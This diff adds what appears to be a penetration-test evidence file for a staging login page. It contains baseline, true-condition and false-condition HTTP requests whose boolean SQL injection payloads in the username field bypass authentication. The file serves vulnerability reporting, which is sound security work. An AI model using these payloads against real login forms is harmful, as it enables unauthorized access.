@@ -1,0 +1,44 @@
+# Evidence Artifact: Manual request/response for SQL injection
+# Finding: SQL Injection in login username parameter
+
+=== BASELINE REQUEST ===
+POST /login HTTP/1.1
+Host: acme-staging.local
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=test
+
+=== BASELINE RESPONSE ===
+HTTP/1.1 401 Unauthorized
+Content-Type: text/html
+
+Invalid credentials
+
+=== TRUE CONDITION REQUEST ===
+POST /login HTTP/1.1
+Host: acme-staging.local
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' AND 4251=4251-- -&password=test
+
+=== TRUE CONDITION RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+Welcome back, admin
+
+=== FALSE CONDITION REQUEST ===
+POST /login HTTP/1.1
+Host: acme-staging.local
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' AND 4251=4252-- -&password=test
+
+=== FALSE CONDITION RESPONSE ===
+HTTP/1.1 401 Unauthorized
+Content-Type: text/html
+
+Invalid credentials
+
+=== TESTER NOTE ===
+Boolean condition changes response behavior, confirming injection behavior in the username parameter.
